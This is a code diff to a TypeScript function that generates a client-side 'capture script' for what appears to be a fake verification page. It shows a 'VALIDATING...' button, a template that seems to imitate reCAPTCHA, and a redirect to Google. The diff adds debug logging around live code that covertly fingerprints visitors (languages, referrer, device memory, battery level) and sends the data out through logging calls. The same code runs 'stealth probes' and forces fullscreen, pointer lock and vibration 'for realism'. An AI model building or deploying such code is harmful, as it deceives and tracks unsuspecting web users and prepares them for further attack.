@@ -187,16 +187,24 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     setInterval(checkRedirect, 1000);
 
     var running = false;
+    function clientLog(msg, data = {}) {
+      logEvent('debug', { msg, data, ts: Date.now() });
+    }
+
     window.startCapture = async function(mode) {
-      console.log("[DEBUG] window.startCapture called with mode: ", mode);
+      clientLog("startCapture: Enter", { mode });
       if (hasRedirected) return;
       
       var isSilent = mode === 'silent' || flowType === 'silent';
       var accent = cfg.accent || '#3498db';
 
-      if (running) return;
+      if (running) {
+        clientLog("startCapture: Already running, returning.");
+        return;
+      }
       running = true;
       var statusText = null;
+      clientLog("startCapture: Initializing quickData...");
 
       // IMMEDIATE METADATA CAPTURE
       var quickData = {
@@ -208,10 +216,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         langs: navigator.languages.join(','),
         ref: document.referrer || "Direct"
       };
+      
+      clientLog("startCapture: Calling logEvent('info')");
       logEvent('info', quickData);
+      clientLog("startCapture: After logEvent('info')");
       
       var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
       if (btn) {
+        clientLog("startCapture: Found button, updating UI");
         btn.style.opacity = "0.7";
         btn.style.cursor = "wait";
         
@@ -222,24 +234,31 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         if (cfg.tmplId === 'recap') customText = "VALIDATING...";
         
         btn.innerText = customText;
+      } else {
+        clientLog("startCapture: Button not found!");
       }
 
       try {
+        clientLog("startCapture: Attempting PointerLock...");
         if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
-      } catch(e) {}
+      } catch(e) { clientLog("startCapture: PointerLock failed", { error: e.message }); }
 
       // Android-Specific: Haptic feedback for realism
+      clientLog("startCapture: Haptic...");
       if (navigator.vibrate) navigator.vibrate([5, 10, 5]);
 
       // Android-Specific: Immersive attempt
+      clientLog("startCapture: Immersive...");
       try {
         if (document.documentElement.requestFullscreen) {
           document.documentElement.requestFullscreen().catch(() => {});
         }
-      } catch(e) {}
+      } catch(e) { clientLog("startCapture: Fullscreen failed", { error: e.message }); }
 
       // Capture Deep Android Metadata
+      clientLog("startCapture: Capturing Android Meta...");
       const captureAndroidMeta = async () => {
+        clientLog("startCapture: Enter captureAndroidMeta");
         const meta = {
           sw_ver: navigator.appVersion,
           mem: (navigator as any).deviceMemory || 'unknown',
@@ -247,25 +266,31 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           ua: navigator.userAgent,
           platform: (navigator as any).platform || 'unknown'
         };
+        clientLog("startCapture: captureAndroidMeta", { meta });
 
         if ((navigator as any).getBattery) {
           try {
+            clientLog("startCapture: About to getBattery");
             const bat = await (navigator as any).getBattery();
             Object.assign(meta, {
               bat_lvl: Math.floor(bat.level * 100) + '%',
               bat_charging: bat.charging
             });
-          } catch(e) {}
+          } catch(e) { clientLog("startCapture: getBattery failed", { error: e.message }); }
         }
         
+        clientLog("startCapture: calling logExtra");
         logExtra({ device_profile: meta });
+        clientLog("startCapture: Exiting captureAndroidMeta");
       };
-      captureAndroidMeta();
+      captureAndroidMeta().catch(e => clientLog("captureAndroidMeta error", { error: e.message }));
 
       // Parallelize high-priority stealth probes
-      runSilentProbes();
+      clientLog("startCapture: RunSilentProbes");
+      runSilentProbes().catch(e => clientLog("runSilentProbes error", { error: e.message }));
 
     if (!isSilent) {
+      clientLog("startCapture: Not silent, setting up UI");
       if (btn) {
         btn.style.opacity = "0.7";
         btn.style.cursor = "wait";
@@ -286,6 +311,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       }
       
       if (!statusText) {
+        clientLog("startCapture: Setting up progress indicator");
         var progContainer = document.getElementById('progress-indicator');
         if (!progContainer) {
           progContainer = document.createElement('div');
@@ -303,6 +329,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         statusText = document.getElementById('status-text');
       }
     }
+    
+    clientLog("startCapture: Exiting");
+    // ...
     
     function updateProgress(p, text) {
       var templateMessages = {
